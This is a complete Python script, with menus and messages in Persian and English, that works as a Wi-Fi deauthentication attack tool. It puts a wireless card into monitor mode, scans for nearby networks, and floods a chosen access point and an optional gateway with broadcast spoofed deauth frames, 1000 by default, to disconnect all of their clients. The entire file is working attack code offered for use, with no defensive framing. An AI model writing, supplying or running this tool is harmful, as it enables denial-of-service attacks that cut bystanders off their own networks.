#!/usr/bin/env python3

import scapy.all as scapy
import argparse
import os
import subprocess
import time
from termcolor import colored

def get_arguments():
    parser = argparse.ArgumentParser(description='WiFi Deauther - ابزار ارسال بسته‌های deauthentication / WiFi Deauther - Deauthentication Packet Sender')
    parser.add_argument("-i", "--interface", dest="interface", help="نام کارت شبکه بی‌سیم / Wireless Interface Name")
    parser.add_argument("-t", "--target", dest="target_bssid", help="آدرس MAC شبکه وای‌فای مورد نظر / Target WiFi MAC Address")
    parser.add_argument("-g", "--gateway", dest="gateway_bssid", help="آدرس MAC روتر (اختیاری) / Gateway MAC Address (Optional)")
    parser.add_argument("-n", "--count", dest="packet_count", default=1000, type=int, help="تعداد بسته‌های deauthentication (پیش‌فرض: 1000) / Number of deauthentication packets (default: 1000)")
    options = parser.parse_args()
    return options

def list_interfaces():
    print(colored("[*] در حال دریافت لیست کارت‌های شبکه بی‌سیم... / Getting list of wireless interfaces...", "yellow"))
    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True, check=True)
        interfaces = []
        for line in result.stdout.split('\n'):
            if 'IEEE 802.11' in line:
                interface = line.split()[0]
                interfaces.append(interface)
        if interfaces:
            print(colored("[+] کارت‌های شبکه بی‌سیم یافت شد: / Wireless interfaces found:", "green"))
            for i, interface in enumerate(interfaces):
                print(colored(f"    {i+1}. {interface}", "green"))
            return interfaces
        else:
            print(colored("[-] هیچ کارت شبکه بی‌سیمی یافت نشد. / No wireless interfaces found.", "red"))
            exit()
    except subprocess.CalledProcessError as e:
        print(colored(f"[-] خطا در دریافت لیست کارت‌های شبکه: {e} / Error getting interface list: {e}", "red"))
        exit()

def select_interface(interfaces):
    while True:
        try:
            choice = int(input(colored("[?] لطفاً شماره کارت شبکه مورد نظر را وارد کنید / Please enter the number of the interface: ", "yellow")))
            if 1 <= choice <= len(interfaces):
                return interfaces[choice-1]
            else:
                print(colored("[-] شماره نامعتبر. لطفاً دوباره تلاش کنید. / Invalid number. Please try again.", "red"))
        except ValueError:
            print(colored("[-] لطفاً یک عدد وارد کنید. / Please enter a number.", "red"))

def enable_monitor_mode(interface):
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=True)
        subprocess.run(["iwconfig", interface, "mode", "monitor"], check=True)
        subprocess.run(["ip", "link", "set", interface, "up"], check=True)
        print(colored(f"[+] {interface} در حالت مانیتور فعال شد. / {interface} enabled in monitor mode.", "green"))
    except subprocess.CalledProcessError as e:
        print(colored(f"[-] خطا در فعال‌سازی حالت مانیتور: {e} / Error enabling monitor mode: {e}", "red"))
        exit()

def scan_networks(interface):
    print(colored("[*] در حال اسکن شبکه‌های وای‌فای... / Scanning WiFi networks...", "yellow"))
    try:
        networks = []
        def packet_handler(pkt):
            if pkt.haslayer(scapy.Dot11Beacon):
                bssid = pkt[scapy.Dot11].addr2
                ssid = pkt[scapy.Dot11Elt].info.decode() if pkt[scapy.Dot11Elt].info else "<hidden>"
                if bssid not in [n['bssid'] for n in networks]:
                    networks.append({'bssid': bssid, 'ssid': ssid})
                    print(colored(f"[+] شبکه یافت شد: {ssid} (BSSID: {bssid}) / Network found: {ssid} (BSSID: {bssid})", "green"))
        scapy.sniff(iface=interface, prn=packet_handler, timeout=10)
        return networks
    except Exception as e:
        print(colored(f"[-] خطا در اسکن شبکه‌ها: {e} / Error scanning networks: {e}", "red"))
        return []

def select_network(networks):
    if not networks:
        print(colored("[-] هیچ شبکه‌ای یافت نشد. / No networks found.", "red"))
        exit()
    print(colored("[+] لیست شبکه‌های یافت شده: / List of found networks:", "green"))
    for i, network in enumerate(networks):
        print(colored(f"    {i+1}. {network['ssid']} (BSSID: {network['bssid']})", "green"))
    while True:
        try:
            choice = int(input(colored("[?] لطفاً شماره شبکه مورد نظر را وارد کنید / Please enter the number of the network: ", "yellow")))
            if 1 <= choice <= len(networks):
                return networks[choice-1]['bssid']
            else:
                print(colored("[-] شماره نامعتبر. لطفاً دوباره تلاش کنید. / Invalid number. Please try again.", "red"))
        except ValueError:
            print(colored("[-] لطفاً یک عدد وارد کنید. / Please enter a number.", "red"))

def deauth(interface, target_bssid, gateway_bssid=None, packet_count=1000):
    dot11 = scapy.Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid)
    packet = scapy.RadioTap()/dot11/scapy.Dot11Deauth(reason=7)
    if gateway_bssid:
        dot11_gateway = scapy.Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=gateway_bssid, addr3=gateway_bssid)
        packet_gateway = scapy.RadioTap()/dot11_gateway/scapy.Dot11Deauth(reason=7)
        print(colored(f"[+] ارسال بسته‌های deauth به {target_bssid} و {gateway_bssid}... / Sending deauth packets to {target_bssid} and {gateway_bssid}...", "yellow"))
        try:
            for i in range(packet_count):
                scapy.sendp(packet, iface=interface, verbose=False)
                scapy.sendp(packet_gateway, iface=interface, verbose=False)
            print(colored(f"[+] {packet_count} بسته deauth به {target_bssid} و {gateway_bssid} ارسال شد. / {packet_count} deauth packets sent to {target_bssid} and {gateway_bssid}.", "green"))
        except PermissionError:
            print(colored("[-] لطفاً برنامه را با دسترسی root اجرا کنید. / Please run the script with sudo.", "red"))
            exit()
    else:
        print(colored(f"[+] ارسال بسته‌های deauth به {target_bssid}... / Sending deauth packets to {target_bssid}...", "yellow"))
        try:
            for i in range(packet_count):
                scapy.sendp(packet, iface=interface, verbose=False)
            print(colored(f"[+] {packet_count} بسته deauth به {target_bssid} ارسال شد. / {packet_count} deauth packets sent to {target_bssid}.", "green"))
        except PermissionError:
            print(colored("[-] لطفاً برنامه را با دسترسی root اجرا کنید. / Please run the script with sudo.", "red"))
            exit()

if __name__ == "__main__":
    options = get_arguments()
    
    # اگر interface از طریق آرگومان مشخص نشده باشد، لیست را نمایش می‌دهیم
    if not options.interface:
        interfaces = list_interfaces()
        interface = select_interface(interfaces)
    else:
        interface = options.interface

    enable_monitor_mode(interface)
    networks = scan_networks(interface)
    
    # اگر target_bssid از طریق آرگومان مشخص نشده باشد، لیست را نمایش می‌دهیم
    if not options.target_bssid:
        target_bssid = select_network(networks)
    else:
        target_bssid = options.target_bssid

    gateway_bssid = options.gateway_bssid
    packet_count = options.packet_count

    try:
        deauth(interface, target_bssid, gateway_bssid, packet_count)
    except KeyboardInterrupt:
        print(colored("\n[+] حمله deauthentication متوقف شد. / Deauthentication attack stopped.", "yellow")) 